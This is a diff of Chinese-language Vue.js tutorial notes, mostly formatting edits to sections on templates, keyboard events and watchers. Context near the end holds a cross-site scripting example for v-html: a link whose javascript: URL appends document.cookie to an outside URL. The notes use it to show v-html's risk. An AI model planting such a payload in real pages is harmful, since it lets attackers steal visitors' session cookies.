@@ -37,7 +37,7 @@ Vue.config.productionTip = false; // 关闭Vue生产提示
           (2). a+b
           (3). demo(1)
           (4). x === y ? 'a' : 'b'
-
+   
       2. js代码(语句)
           (1). if(){}
           (2). for(){}
@@ -95,7 +95,7 @@ Vue 中有两种数据绑定的方式：
 
     ```js
     const vm = new Vue({});
-
+    
     vm.$mount("#root"); // 第二种写法
     ```
 
@@ -249,20 +249,39 @@ Vue 的事件修饰符：
 
 ## 9.键盘事件
 
-```
-<input type="text" placeholder="按下回车键提示输入" @keyup.13="showInfo"><br/>
+```html
+<input
+  type="text"
+  placeholder="按下回车键提示输入"
+  @keyup.13="showInfo"
+/><br />
 
-<input type="text" placeholder="按下回车键提示输入" @keyup.enter="showInfo"><br/>
+<input
+  type="text"
+  placeholder="按下回车键提示输入"
+  @keyup.enter="showInfo"
+/><br />
 
-<input type="text" placeholder="按下回车键提示输入" @keyup.enter="showInfo"><br/>
+<input
+  type="text"
+  placeholder="按下回车键提示输入"
+  @keyup.enter="showInfo"
+/><br />
 
-<input type="text" placeholder="按下Ctrl+y提示输入" @keydown.ctrl.y="showInfo"><br/>
+<input
+  type="text"
+  placeholder="按下Ctrl+y提示输入"
+  @keydown.ctrl.y="showInfo"
+/><br />
 
 Vue.config.keyCodes.huiche = 13
-<input type="text" placeholder="按下回车键提示输入" @keydown.huiche="showInfo">
+<input
+  type="text"
+  placeholder="按下回车键提示输入"
+  @keydown.huiche="showInfo"
+/>
 
-console.log(e.key) // 按键名字
-console.log(e.keyCode) // 按键编码
+console.log(e.key) // 按键名字 console.log(e.keyCode) // 按键编码
 console.log(e.target.value)
 ```
 
@@ -333,7 +352,7 @@ computed: {
    (1). new Vue 时传入 watch 配置
    (2). 通过 vm.$watch 监视
 
-```
+```js
 // watch: {
 //   isHot: {
 //     // 初始化时让handler调用一下
@@ -350,7 +369,7 @@ computed: {
 
 1. Vue 中的 watch 默认不监测对象内部值的改变(一层)。
 
-2. 配置 deep:true 可以监测对象内部值改变(多层)。
+2. 配置 `deep:true` 可以监测对象内部值改变(多层)。
 
 备注：  
  (1). Vue 自身可以监测对象内部值的改变，但 Vue 提供的 watch 默认不可以！  
@@ -564,7 +583,7 @@ new Vue({
 
    ```js
    <h2 v-html="str2"></h2>;
-
+   
    str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这里有你要的资源</a>';
    ```
 
@@ -577,7 +596,7 @@ new Vue({
    [v-cloak] {
      display: none;
    }
-
+   
    <div id="root" v-cloak>
      {{name}}
    </div>
